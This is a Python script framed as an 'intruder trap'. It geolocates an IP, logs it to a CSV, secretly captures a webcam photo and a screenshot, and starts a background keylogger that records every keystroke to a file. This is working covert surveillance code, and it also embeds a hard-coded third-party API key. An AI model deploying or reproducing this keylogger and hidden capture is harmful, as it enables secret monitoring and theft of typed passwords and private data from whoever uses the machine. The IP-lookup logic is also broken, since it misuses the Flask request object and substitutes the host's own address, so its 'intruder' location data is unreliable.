import os
import csv
import cv2
import time
import requests
import pyautogui
import threading
import re
from datetime import datetime
from pynput import keyboard
from flask import request

# Define new directories for logs and images
BASE_DIR = os.getcwd()
KEYLOGGER_DIR = os.path.join(BASE_DIR, "keylogger_logs")
CAPTURE_DIR = os.path.join(BASE_DIR, "capture")
INTRUDER_IMAGE_DIR = os.path.join(CAPTURE_DIR, "intruders")
SCREENSHOT_DIR = os.path.join(CAPTURE_DIR, "screenshots")
CSV_FILE = os.path.join(BASE_DIR, "intruder_log.csv")
KEYSTROKE_FILE = os.path.join(KEYLOGGER_DIR, "keystrokes.txt")

# Ensure directories exist
for directory in [KEYLOGGER_DIR, INTRUDER_IMAGE_DIR, SCREENSHOT_DIR]:
    if not os.path.exists(directory):
        os.makedirs(directory)

# Initialize CSV file with headers if it does not exist
def initialize_csv():
    if not os.path.exists(CSV_FILE):
        with open(CSV_FILE, mode="w", newline="") as file:
            writer = csv.writer(file)
            writer.writerow(["Date/Time", "IP", "City", "State", "Country", "Latitude", "Longitude", "ISP"])
        print(f"Initialized {CSV_FILE} with headers.")

# Get the real public IP address
def get_real_ip():
    try:
        if request.headers.get('X-Forwarded-For'):
            client_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
        else:
            client_ip = request.remote_addr  

        # If the IP is private, fetch the real public IPv4
        private_ip_ranges = ["192.168.", "10.", "127.", "172."]
        if any(client_ip.startswith(prefix) for prefix in private_ip_ranges) or client_ip == "127.0.0.1":
            response = requests.get("https://api64.ipify.org?format=json")
            client_ip = response.json().get("ip", "Unknown")

        return client_ip
    except Exception as e:
        print(f"Error getting real IPv4: {e}")
        return "Unknown"

# Get geolocation data using ipgeolocation.io
def get_geolocation(ip_address):
    API_KEY = "f02c382355a542aaaedf29c6fe7352c4"  # Replace with your actual API key

    try:
        url = f"https://api.ipgeolocation.io/ipgeo?apiKey={API_KEY}&ip={ip_address}"
        response = requests.get(url)
        data = response.json()

        return {
            "city": data.get("city", "Unknown"),
            "region": data.get("state_prov", "Unknown"),
            "country": data.get("country_name", "Unknown"),
            "latitude": str(data.get("latitude", "Unknown")),
            "longitude": str(data.get("longitude", "Unknown")),
            "isp": data.get("isp", "Unknown")
        }

    except Exception as e:
        print(f"Error fetching geolocation data: {e}")
        return {
            "city": "Unknown",
            "region": "Unknown",
            "country": "Unknown",
            "latitude": "Unknown",
            "longitude": "Unknown",
            "isp": "Unknown"
        }

# Log intruder data to CSV file
def log_intruder(ip_address, location_data):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    row_data = [
        timestamp,
        ip_address,
        location_data.get("city", "Unknown"),
        location_data.get("region", "Unknown"),
        location_data.get("country", "Unknown"),
        location_data.get("latitude", "Unknown"),
        location_data.get("longitude", "Unknown"),
        location_data.get("isp", "Unknown")
    ]

    retries = 3
    for attempt in range(retries):
        try:
            with open(CSV_FILE, mode="a", newline="") as file:
                writer = csv.writer(file)
                writer.writerow(row_data)
            print(f"Logged intruder: {row_data}")
            break
        except PermissionError:
            print(f"CSV file locked. Retrying... ({attempt+1}/{retries})")
            time.sleep(2)
        except Exception as e:
            print(f"Error writing to CSV file: {e}")
            break

# Sanitize IP for filenames (replace invalid characters)
def sanitize_ip(ip_address):
    return re.sub(r'[^\w]', '_', ip_address)

# Capture an image from the webcam
def capture_image(ip_address):
    sanitized_ip = sanitize_ip(ip_address)
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        print("Error: Could not open the camera.")
        return None

    ret, frame = cap.read()
    cap.release()

    if ret:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"intruder_{sanitized_ip}_{timestamp}.jpg"
        filepath = os.path.join(INTRUDER_IMAGE_DIR, filename)
        
        cv2.imwrite(filepath, frame)  # Ensure image is written
        if os.path.exists(filepath):
            print(f"Image saved: {filepath}")
            return filename
        else:
            print("Error: Image file was not saved.")
            return None
    else:
        print("Error: Failed to capture an image.")
        return None

# Capture a screenshot
def capture_screenshot(ip_address):
    try:
        sanitized_ip = sanitize_ip(ip_address)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{sanitized_ip}_{timestamp}.png"
        filepath = os.path.join(SCREENSHOT_DIR, filename)
        
        screenshot = pyautogui.screenshot()
        screenshot.save(filepath)

        if os.path.exists(filepath):
            print(f"Screenshot saved: {filepath}")
            return filename
        else:
            print("Error: Screenshot file was not saved.")
            return None
    except Exception as e:
        print(f"Error capturing screenshot: {e}")
        return None

# Function to run the keylogger
def run_keylogger():
    def on_press(key):
        try:
            with open(KEYSTROKE_FILE, "a") as file:
                file.write(f"{datetime.now()} - {key.char}\n")
        except AttributeError:
            with open(KEYSTROKE_FILE, "a") as file:
                file.write(f"{datetime.now()} - {key}\n")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Start keylogger in a separate thread
def start_keylogger_thread():
    keylogger_thread = threading.Thread(target=run_keylogger, daemon=True)
    keylogger_thread.start()
    print(f"Keylogger started and logs will be saved in: {KEYLOGGER_DIR}")

# Main function to execute traps
def execute_traps():
    print("Intruder detected! Executing traps...")

    ip_address = get_real_ip()
    location_data = get_geolocation(ip_address)
    log_intruder(ip_address, location_data)
    capture_image(ip_address)
    capture_screenshot(ip_address)
    start_keylogger_thread()

# Run traps only if explicitly called
if __name__ == "__main__":
    initialize_csv()
